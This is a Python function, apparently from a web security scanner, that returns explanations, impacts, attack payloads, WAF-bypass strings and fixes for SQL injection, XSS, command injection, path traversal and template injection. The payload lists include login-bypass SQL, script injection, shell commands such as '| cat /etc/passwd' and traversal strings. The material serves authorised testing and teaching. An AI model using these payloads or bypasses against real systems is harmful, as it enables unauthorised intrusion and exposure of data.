def analyze_web_vulnerability(vuln, request):
    """
    AI-style reasoning engine for web vulnerabilities.
    Returns:
        - explanation
        - impact
        - recommended payloads
        - bypasses
        - remediation
    """

    signature = vuln.get("signature")
    keyword = vuln.get("keyword", "")
    path = request.get("path", "")
    body = request.get("body", "")

    analysis = {"signature": signature}

    if signature == "SQLI_BASIC":
        analysis.update({
            "explanation": (
                f"The parameter appears to be concatenated directly into a SQL query. "
                f"The payload `{keyword}` indicates classic boolean-based SQL injection."
            ),
            "impact": (
                "An attacker can bypass login, extract database contents, modify data, "
                "or escalate privileges."
            ),
            "recommended_payloads": [
                "admin' OR '1'='1 --",
                "' UNION SELECT null,null --",
                "' OR '1'='1' /*",
            ],
            "waf_bypasses": [
                "aDmIn' OR '1'='1 --",
                "admin'/**/OR/**/'1'='1",
                "%27%20OR%20%271%27%3D%271 --",
            ],
            "remediation": (
                "Use prepared statements (parameterized queries), ORM-level escaping, "
                "and strict input validation."
            )
        })

    elif signature == "XSS_BASIC":
        analysis.update({
            "explanation": (
                "User input appears to be reflected in the response without sanitization, "
                "leading to possible script execution."
            ),
            "impact": (
                "Session hijacking, credential theft, or full account compromise."
            ),
            "recommended_payloads": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert('XSS')>",
            ],
            "waf_bypasses": [
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "<svg/onload=alert(1)>",
            ],
            "remediation": (
                "Apply output encoding (HTML entity encoding) and use a CSP header."
            )
        })

    elif signature == "CMD_INJECTION":
        analysis.update({
            "explanation": (
                "User input is likely passed to a system shell command. "
                "Keyword indicates unsanitized command concatenation."
            ),
            "impact": "Remote command execution (RCE), full system compromise.",
            "recommended_payloads": ["; whoami", "&& id", "| cat /etc/passwd"],
            "waf_bypasses": [";${IFS}whoami", "%3Bwhoami", "`whoami`"],
            "remediation": "Avoid shell execution; use safe libraries (subprocess with args list)."
        })

    elif signature == "PATH_TRAVERSAL":
        analysis.update({
            "explanation": (
                "User-controlled path input is not sanitized, allowing directory traversal."
            ),
            "impact": "File read, credential leak, config exposure.",
            "recommended_payloads": ["../../../../etc/passwd"],
            "waf_bypasses": ["..%2f..%2f..%2fetc/passwd", ".././.././etc/passwd"],
            "remediation": "Canonicalize paths and enforce allowed-file whitelists."
        })

    elif signature == "SSTI":
        analysis.update({
            "explanation": "Input appears injected into a server-side template engine.",
            "impact": "Remote code execution depending on template engine.",
            "recommended_payloads": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
            "waf_bypasses": ["{{7*'1'}}"],
            "remediation": "Disable template evaluation on user inputs."
        })

    else:
        analysis.update({
            "explanation": "Unknown signature type. No advanced reasoning available yet.",
            "impact": "Unknown",
            "recommended_payloads": [],
            "waf_bypasses": [],
            "remediation": "No data available."
        })

    return analysis
